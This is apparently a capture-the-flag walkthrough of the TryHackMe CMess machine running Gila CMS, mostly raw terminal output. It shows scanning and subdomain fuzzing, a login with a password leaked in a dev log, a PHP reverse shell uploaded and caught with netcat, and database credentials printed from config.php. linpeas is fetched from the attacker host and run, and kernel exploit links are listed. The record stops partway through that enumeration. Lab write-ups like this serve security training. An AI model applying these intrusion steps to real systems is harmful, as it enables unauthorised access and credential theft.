----
Can you root this Gila CMS box?
---

![](https://i.imgur.com/qnV5dJQ.png)

### Flags

 Start Machine

Please add `MACHINE_IP cmess.thm` to /etc/hosts

Please also note that this box does not require brute forcing!

Answer the questions below

```bash
┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ tail /etc/hosts                                
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm

┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ rustscan -a 10.10.105.35 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.105.35:22
Open 10.10.105.35:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 12:26 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
Initiating Connect Scan at 12:26
Scanning cmess.thm (10.10.105.35) [2 ports]
Discovered open port 22/tcp on 10.10.105.35
Discovered open port 80/tcp on 10.10.105.35
Completed Connect Scan at 12:26, 0.21s elapsed (2 total ports)
Initiating Service scan at 12:26
Scanning 2 services on cmess.thm (10.10.105.35)
Completed Service scan at 12:26, 6.81s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.105.35.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 7.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 1.70s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
Nmap scan report for cmess.thm (10.10.105.35)
Host is up, received user-set (0.21s latency).
Scanned at 2023-03-14 12:26:18 EDT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-generator: Gila CMS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:26
Completed NSE at 12:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.14 seconds

┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ wfuzz -u cmess.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cmess.thm" --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /home/witty/.local/lib/python3.11/site-packages/requests/__init__.py:89: RequestsDependencyWarning:urllib3 (1.26.15) or chardet (5.1.0) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"       
000000014:   200        107 L    290 W      3898 Ch     "autoconfig"
000000001:   200        107 L    290 W      3877 Ch     "www"       
000000003:   200        107 L    290 W      3877 Ch     "ftp"       
000000007:   200        107 L    290 W      3889 Ch     "webdisk"   
000000016:   200        107 L    290 W      3880 Ch     "test"      
000000018:   200        107 L    290 W      3880 Ch     "blog"      
000000015:   200        107 L    290 W      3874 Ch     "ns"        
000000017:   200        107 L    290 W      3871 Ch     "m"         
000000020:   200        107 L    290 W      3880 Ch     "www2"      
000000013:   200        107 L    290 W      3904 Ch     "autodiscove
                                                        r"          
000000005:   200        107 L    290 W      3889 Ch     "webmail"   
000000009:   200        107 L    290 W      3886 Ch     "cpanel"    
000000004:   200        107 L    290 W      3895 Ch     "localhost" 
000000011:   200        107 L    290 W      3877 Ch     "ns1"       
000000006:   200        107 L    290 W      3880 Ch     "smtp"      
000000002:   200        107 L    290 W      3880 Ch     "mail"      
000000012:   200        107 L    290 W      3877 Ch     "ns2"       
000000008:   200        107 L    290 W      3877 Ch     "pop"       
000000010:   200        107 L    290 W      3877 Ch     "whm"       
000000021:   200        107 L    290 W      3877 Ch     "ns3"       
000000024:   200        107 L    290 W      3883 Ch     "admin"     
000000028:   200        107 L    290 W      3880 Ch     "imap"      
000000031:   200        107 L    290 W      3886 Ch     "mobile"    
000000027:   200        107 L    290 W      3874 Ch     "mx"        
000000025:   200        107 L    290 W      3883 Ch     "mail2"     
000000029:   200        107 L    290 W      3877 Ch     "old"       
000000023:   200        107 L    290 W      3883 Ch     "forum"     
000000022:   200        107 L    290 W      3880 Ch     "pop3"      
000000026:   200        107 L    290 W      3877 Ch     "vpn"       
000000035:   200        107 L    290 W      3874 Ch     "cp"        
000000037:   200        107 L    290 W      3880 Ch     "shop"      
000000032:   200        107 L    290 W      3883 Ch     "mysql"     
000000043:   200        107 L    290 W      3883 Ch     "lists"     
000000040:   200        107 L    290 W      3877 Ch     "ns4"       
000000034:   200        107 L    290 W      3889 Ch     "support"   
000000038:   200        107 L    290 W      3880 Ch     "demo"      
000000033:   200        107 L    290 W      3880 Ch     "beta"      
000000030:   200        107 L    290 W      3877 Ch     "new"       
000000036:   200        107 L    290 W      3886 Ch     "secure"    
000000044:   200        107 L    290 W      3877 Ch     "web"       
000000059:   200        107 L    290 W      3895 Ch     "www.forum" 
000000045:   200        107 L    290 W      3880 Ch     "www1"      
000000060:   200        107 L    290 W      3892 Ch     "www.test"  
000000039:   200        107 L    290 W      3880 Ch     "dns2"      
000000047:   200        107 L    290 W      3880 Ch     "news"      
000000058:   200        107 L    290 W      3892 Ch     "intranet"  
000000042:   200        107 L    290 W      3886 Ch     "static"    
000000051:   200        107 L    290 W      3877 Ch     "api"       
000000041:   200        107 L    290 W      3880 Ch     "dns1"      
000000056:   200        107 L    290 W      3877 Ch     "dns"       
000000050:   200        107 L    290 W      3880 Ch     "wiki"      
000000055:   200        107 L    290 W      3886 Ch     "backup"    
000000048:   200        107 L    290 W      3886 Ch     "portal"    
000000054:   200        107 L    290 W      3892 Ch     "www.blog"  
000000046:   200        107 L    290 W      3877 Ch     "img"       
000000052:   200        107 L    290 W      3883 Ch     "media"     
000000053:   200        107 L    290 W      3886 Ch     "images"    
000000049:   200        107 L    290 W      3886 Ch     "server"    
000000057:   200        107 L    290 W      3877 Ch     "sql"       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 60
Filtered Requests: 0
Requests/sec.: 0

there are many subdomains let's use dev, server, sql, backup

┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ tail /etc/hosts
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm

if we don't find something interesting let's change it

http://dev.cmess.thm/

Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%

┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ gobuster -t 64 dir -e -k -u http://cmess.thm -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cmess.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/14 12:41:48 Starting gobuster in directory enumeration mode
===============================================================
http://cmess.thm/.htpasswd            (Status: 403) [Size: 274]
http://cmess.thm/0                    (Status: 200) [Size: 3851]
http://cmess.thm/01                   (Status: 200) [Size: 4078]
http://cmess.thm/1                    (Status: 200) [Size: 4078]
http://cmess.thm/1x1                  (Status: 200) [Size: 4078]
http://cmess.thm/about                (Status: 200) [Size: 3353]
http://cmess.thm/About                (Status: 200) [Size: 3339]
http://cmess.thm/admin                (Status: 200) [Size: 1580]
http://cmess.thm/.hta                 (Status: 403) [Size: 274]
http://cmess.thm/api                  (Status: 200) [Size: 0]
http://cmess.thm/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]
http://cmess.thm/author               (Status: 200) [Size: 3590]
http://cmess.thm/.htaccess            (Status: 403) [Size: 274]
http://cmess.thm/blog                 (Status: 200) [Size: 3851]
http://cmess.thm/category             (Status: 200) [Size: 3862]
http://cmess.thm/cm                   (Status: 500) [Size: 0]
Progress: 1213 / 4615 (26.28%)^C
[!] Keyboard interrupt detected, terminating.

[ERROR] 2023/03/14 12:41:58 [!] context canceled
===============================================================
2023/03/14 12:41:58 Finished
===============================================================

http://cmess.thm/admin

andre@cmess.thm : KPFTN_f2yxe%

login

go to content > file manager > upload revshell

config.php

<?php

$GLOBALS['config'] = array (
  'db' => 
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'permissions' => 
  array (
    1 => 
    array (
      0 => 'admin',
      1 => 'admin_user',
      2 => 'admin_userrole',
    ),
  ),
  'packages' => 
  array (
    0 => 'blog',
  ),
  'base' => 'http://cmess.thm/gila/',
  'theme' => 'gila-blog',
  'title' => 'Gila CMS',
  'slogan' => 'An awesome website!',
  'default-controller' => 'blog',
  'timezone' => 'America/Mexico_City',
  'ssl' => '',
  'env' => 'pro',
  'check4updates' => 1,
  'language' => 'en',
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);

go to assets and there'll be the revshell

http://cmess.thm/assets/payload_ivan.php

┌──(witty㉿kali)-[~/bug_hunter/MyScripts]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.105.35] 48480
SOCKET: Shell has connected! PID: 2496
python3 -c 'import pty;pty.spawn("/bin/bash")'

let's upload linpeas

──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.105.35 - - [14/Mar/2023 12:50:03] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@cmess:/var/www/html/assets$ cd /tmp
cd /tmp
www-data@cmess:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--2023-03-14 09:50:03--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

2023-03-14 09:50:08 (203 KB/s) - 'linpeas.sh' saved [828098/828098]

www-data@cmess:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@cmess:/tmp$ ./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: cmess
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Tue Mar 14 10:00:25 PDT 2023
 10:00:25 up 37 min,  0 users,  load average: 2.53, 2.05, 1.55

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=5c88f34b-fd0f-4ec2-8c34-04067bb27ec4	/	ext4	errors=remount-ro	0 1
UUID=e33d49cc-1f73-4faf-b2f2-fd4f6c601c58	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
SHLVL=1
OLDPWD=/var/www/html/assets
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
